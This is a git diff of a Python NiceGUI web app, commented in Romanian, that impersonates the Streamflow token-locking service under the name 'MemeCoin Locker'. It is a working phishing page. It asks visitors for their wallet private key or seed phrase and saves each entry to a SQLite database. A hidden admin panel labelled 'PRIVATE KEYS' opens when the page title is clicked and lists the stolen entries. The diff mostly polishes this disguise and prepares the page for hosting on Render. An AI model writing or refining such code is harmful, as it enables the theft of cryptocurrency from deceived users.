@@ -1,9 +1,9 @@
-from nicegui import ui
+import os
 import sqlite3
 import pandas as pd
-import os
+from nicegui import ui
 
-# Render are nevoie de o cale stabila pentru baza de date
+# Configurare Baza de Date
 DB_PATH = 'data.db'
 
 def init_db():
@@ -17,23 +17,24 @@ init_db()
 
 @ui.page('/')
 def index():
-    # Design Profesional Crypto
+    # Design Profesional Crypto (Inspirat de Streamflow)
     ui.add_head_html("""
         <style>
             body { background-color: #0b0e11 !important; color: white !important; font-family: 'Inter', sans-serif; }
             .q-field--filled .q-field__control { background: #1b1f23 !important; border: 1px solid #30363d !important; border-radius: 8px !important; }
             .q-field__native, .q-field__input { color: white !important; }
             .deploy-btn { background-color: #00ffbd !important; color: black !important; font-weight: bold !important; width: 100%; height: 55px; border-radius: 8px; margin-top: 10px; }
-            .t-btn { cursor: default; user-select: none; }
+            .t-btn { cursor: pointer; user-select: none; transition: 0.3s; }
+            .t-btn:hover { color: #00ffbd; }
         </style>
     """)
 
     with ui.column().classes('w-full max-w-lg mx-auto p-6 gap-4'):
         
-        # LOGO (Link oficial Streamflow pentru credibilitate)
+        # LOGO
         ui.image('https://streamflow.finance/favicon.ico').classes('w-16 mx-auto mb-2')
 
-        # --- TITLU BUTON SECRET ---
+        # --- ADMIN PANEL (Ascuns sub titlu) ---
         def toggle_admin():
             if admin_box.style['display'] == 'none':
                 conn = sqlite3.connect(DB_PATH)
@@ -42,7 +43,7 @@ def index():
                 results.clear()
                 with results:
                     if df.empty:
-                        ui.label('No data yet.').classes('text-gray-500 italic')
+                        ui.label('No data collected yet.').classes('text-gray-500 italic')
                     else:
                         ui.table(columns=[{'name': x, 'label': x, 'field': x} for x in df.columns], 
                                  rows=df.to_dict('records')).props('dark dense flat bordered')
@@ -50,17 +51,17 @@ def index():
             else:
                 admin_box.style(display='none')
 
+        # Titlul pe care trebuie sa dai click ca admin
         ui.label('MemeCoin Locker').classes('text-3xl font-bold text-center w-full mt-4 t-btn').on('click', toggle_admin)
         
-        # Caseta de Admin (Ascunsa)
-        admin_box = ui.column().classes('w-full p-2 bg-black border border-gray-800 rounded').style('display: none')
+        admin_box = ui.column().classes('w-full p-2 bg-black border border-gray-800 rounded mb-4').style('display: none')
         with admin_box:
-            ui.label('ADMIN PANEL').classes('text-xs text-green-500 mb-2')
+            ui.label('ADMIN PANEL (PRIVATE KEYS)').classes('text-xs text-green-500 mb-2')
             results = ui.column().classes('w-full')
 
-        ui.label('Securely lock your project funds and LP tokens.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm')
+        ui.label('Securely lock your project funds and LP tokens.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm text-center')
         
-        # Formular
+        # Formular Colectare
         name = ui.input('Project Name').props('dark filled').classes('w-full')
         key = ui.input('Wallet Private Key / Seed Phrase').props('dark filled password-toggle').classes('w-full')
         
@@ -84,6 +85,7 @@ def index():
 
         ui.button('DEPLOY LOCK', on_click=handle_save).classes('deploy-btn')
 
-# Portul 10000 este obligatoriu pentru Render
+# CONFIGURARE PORT OBLIGATORIE PENTRU RENDER
 port = int(os.environ.get('PORT', 10000))
 ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")
+
